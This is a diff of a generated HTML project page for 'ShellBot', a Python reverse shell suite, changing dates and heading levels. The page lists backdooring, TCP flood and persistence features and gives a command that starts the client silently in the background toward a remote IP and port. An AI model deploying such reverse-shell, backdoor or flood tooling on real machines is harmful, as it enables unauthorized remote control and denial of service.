@@ -42,8 +42,8 @@ An advanced reverse shell written in Python3.  ShellBot is a cross-platform Remo
 A server can accept several clients at once, and relay a chosen client&rsquo;s shell to the controller.
 This makes it easy for an SysAdmin to manage several computers with minimal setup in an internal network.
 The ShellBot suite is designed in such a way that it will not stop till a connection is achieved.">
-<meta itemprop="datePublished" content="2020-08-21T22:31:49&#43;05:30" />
-<meta itemprop="dateModified" content="2020-08-21T22:31:49&#43;05:30" />
+<meta itemprop="datePublished" content="2020-10-22T18:13:46&#43;05:30" />
+<meta itemprop="dateModified" content="2020-10-22T18:13:46&#43;05:30" />
 <meta itemprop="wordCount" content="318">
 <meta itemprop="image" content="/"/>
 
@@ -71,15 +71,15 @@ The ShellBot suite is designed in such a way that it will not stop till a connec
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/projects/shellbot/" />
 <meta property="og:image" content="/"/>
-<meta property="article:published_time" content="2020-08-21T22:31:49+05:30" />
-<meta property="article:modified_time" content="2020-08-21T22:31:49+05:30" />
+<meta property="article:published_time" content="2020-10-22T18:13:46+05:30" />
+<meta property="article:modified_time" content="2020-10-22T18:13:46+05:30" />
 
 
 
 
 
 
-    <meta property="article:published_time" content="2020-08-21 22:31:49 &#43;0530 &#43;0530" />
+    <meta property="article:published_time" content="2020-10-22 18:13:46 &#43;0530 &#43;0530" />
 
 
 
@@ -156,6 +156,14 @@ The ShellBot suite is designed in such a way that it will not stop till a connec
         <li></li>
       </ul>
     </li>
+    <li><a href="#features">Features:</a>
+      <ul>
+        <li><a href="#server">Server:</a></li>
+        <li><a href="#client">Client:</a></li>
+        <li><a href="#controller">Controller:</a></li>
+      </ul>
+    </li>
+    <li><a href="#example">Example:</a></li>
     <li><a href="#license">License</a></li>
   </ul>
 </nav>
@@ -179,8 +187,8 @@ setup in an internal network.</p>
 connection is achieved. All errors are handled internally and in case of a
 crash, the program automatically restarts.</p>
 <hr>
-<h4 id="features">Features:</h4>
-<h5 id="server">Server:</h5>
+<h2 id="features">Features:</h2>
+<h3 id="server">Server:</h3>
 <ol>
 <li>Can handle multiple connections all at once.</li>
 <li>The Controller’s connection requires a plain text password, it’s not the best
@@ -189,7 +197,7 @@ future revisions.</li>
 <li>Kicks the Controller after 5 mins. (As the Server only accepts 1 controller
 at a time). <em>TODO: Make it 5 minutes after inactivity.</em></li>
 </ol>
-<h5 id="client">Client:</h5>
+<h3 id="client">Client:</h3>
 <ol>
 <li>Infected PHP Backdooring Function. <em>(Linux Only)</em></li>
 <li>TCP Flood.</li>
@@ -209,7 +217,7 @@ will result in losing the shell.</li>
 <li>Uses very less resources.</li>
 <li>Can be packaged into executables with tools like pyInstaller.</li>
 </ol>
-<h5 id="controller">Controller:</h5>
+<h3 id="controller">Controller:</h3>
 <ol>
 <li>Handles <code>KeyboardInterrupts</code>, empty commands, etc. perfectly.</li>
 <li>Easy user interface.</li>
@@ -217,7 +225,7 @@ will result in losing the shell.</li>
 <p><strong>Note:</strong> When trying to start the client through SSH, Terminal or any other
 interactive shell, it is advised to start the client in another process. This
 can be done in Linux with <code>nohup</code>.</p>
-<h6 id="example">Example:</h6>
+<h2 id="example">Example:</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nohup python3 client.py 15.48.158.15 <span style="color:#ae81ff">1567</span> &gt; /dev/null &amp;
 
 nohup python3 client.py 15.48.158.15 <span style="color:#ae81ff">1567</span> &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
